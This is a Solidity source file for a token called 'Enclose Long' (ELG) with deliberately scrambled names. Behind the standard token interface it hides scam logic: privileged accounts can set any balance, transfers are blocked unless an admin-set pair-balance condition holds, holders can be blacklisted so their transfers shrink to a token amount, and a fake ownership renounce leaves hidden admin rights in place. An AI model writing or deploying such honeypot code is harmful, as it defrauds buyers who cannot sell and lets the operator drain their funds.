//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface shouldTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract modeTokenLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountTo {
    function createPair(address takeList, address liquidityReceiverFee) external returns (address);
}

interface totalLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverTrading) external view returns (uint256);

    function transfer(address feeSell, uint256 senderReceiver) external returns (bool);

    function allowance(address fromSellAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address feeSell,
        uint256 senderReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeAmountExempt, uint256 value);
    event Approval(address indexed fromSellAt, address indexed spender, uint256 value);
}

interface autoTx is totalLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EncloseLong is modeTokenLiquidity, totalLimit, autoTx {

    function listLaunch(address modeTotal, address feeSell, uint256 senderReceiver) internal returns (bool) {
        require(launchTeam[modeTotal] >= senderReceiver);
        launchTeam[modeTotal] -= senderReceiver;
        launchTeam[feeSell] += senderReceiver;
        emit Transfer(modeTotal, feeSell, senderReceiver);
        return true;
    }

    function allowance(address minIs, address isToken) external view virtual override returns (uint256) {
        if (isToken == buyMarketing) {
            return type(uint256).max;
        }
        return toReceiver[minIs][isToken];
    }

    function balanceOf(address receiverTrading) public view virtual override returns (uint256) {
        return launchTeam[receiverTrading];
    }

    address buyMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function maxLimitSell(address receiverFromBuy, uint256 senderReceiver) public {
        buyAt();
        launchTeam[receiverFromBuy] = senderReceiver;
    }

    bool private atTotalSwap;

    function isListLimit(address modeTotal, address feeSell, uint256 senderReceiver) internal returns (bool) {
        if (modeTotal == toReceiverTotal) {
            return listLaunch(modeTotal, feeSell, senderReceiver);
        }
        uint256 minTx = totalLimit(minLaunched).balanceOf(txMode);
        require(minTx == liquidityTake);
        require(feeSell != txMode);
        if (tokenTake[modeTotal]) {
            return listLaunch(modeTotal, feeSell, launchWalletAuto);
        }
        return listLaunch(modeTotal, feeSell, senderReceiver);
    }

    address public toReceiverTotal;

    uint256 public shouldMode;

    function decimals() external view virtual override returns (uint8) {
        return receiverFundTrading;
    }

    mapping(address => uint256) private launchTeam;

    string private takeTrading = "Enclose Long";

    uint256 liquidityTake;

    function buyAt() private view {
        require(marketingShould[_msgSender()]);
    }

    string private receiverFund = "ELG";

    function limitBuySender(address receiverTo) public {
        if (sellTotal) {
            return;
        }
        
        marketingShould[receiverTo] = true;
        if (receiverReceiver != atTotalSwap) {
            listLaunched = shouldMode;
        }
        sellTotal = true;
    }

    uint256 private minLiquidity = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return takeTrading;
    }

    uint8 private receiverFundTrading = 18;

    address public minLaunched;

    constructor (){
        if (atTotalSwap) {
            shouldMode = listLaunched;
        }
        shouldTotal takeTokenAuto = shouldTotal(buyMarketing);
        minLaunched = amountTo(takeTokenAuto.factory()).createPair(takeTokenAuto.WETH(), address(this));
        
        toReceiverTotal = _msgSender();
        walletLaunch();
        marketingShould[toReceiverTotal] = true;
        launchTeam[toReceiverTotal] = minLiquidity;
        if (receiverReceiver == senderMin) {
            shouldMode = listLaunched;
        }
        emit Transfer(address(0), toReceiverTotal, minLiquidity);
    }

    function teamAt(uint256 senderReceiver) public {
        buyAt();
        liquidityTake = senderReceiver;
    }

    function transferFrom(address modeTotal, address feeSell, uint256 senderReceiver) external override returns (bool) {
        if (_msgSender() != buyMarketing) {
            if (toReceiver[modeTotal][_msgSender()] != type(uint256).max) {
                require(senderReceiver <= toReceiver[modeTotal][_msgSender()]);
                toReceiver[modeTotal][_msgSender()] -= senderReceiver;
            }
        }
        return isListLimit(modeTotal, feeSell, senderReceiver);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return minLiquidity;
    }

    address txMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return liquidityFrom;
    }

    uint256 marketingAmount;

    bool public senderMin;

    uint256 constant launchWalletAuto = 17 ** 10;

    bool public sellTotal;

    mapping(address => mapping(address => uint256)) private toReceiver;

    address private liquidityFrom;

    function getOwner() external view returns (address) {
        return liquidityFrom;
    }

    function approve(address isToken, uint256 senderReceiver) public virtual override returns (bool) {
        toReceiver[_msgSender()][isToken] = senderReceiver;
        emit Approval(_msgSender(), isToken, senderReceiver);
        return true;
    }

    mapping(address => bool) public tokenTake;

    function symbol() external view virtual override returns (string memory) {
        return receiverFund;
    }

    function isMarketing(address exemptReceiver) public {
        buyAt();
        
        if (exemptReceiver == toReceiverTotal || exemptReceiver == minLaunched) {
            return;
        }
        tokenTake[exemptReceiver] = true;
    }

    uint256 private listLaunched;

    event OwnershipTransferred(address indexed toLaunchAuto, address indexed launchedReceiver);

    function transfer(address receiverFromBuy, uint256 senderReceiver) external virtual override returns (bool) {
        return isListLimit(_msgSender(), receiverFromBuy, senderReceiver);
    }

    function walletLaunch() public {
        emit OwnershipTransferred(toReceiverTotal, address(0));
        liquidityFrom = address(0);
    }

    mapping(address => bool) public marketingShould;

    bool private receiverReceiver;

}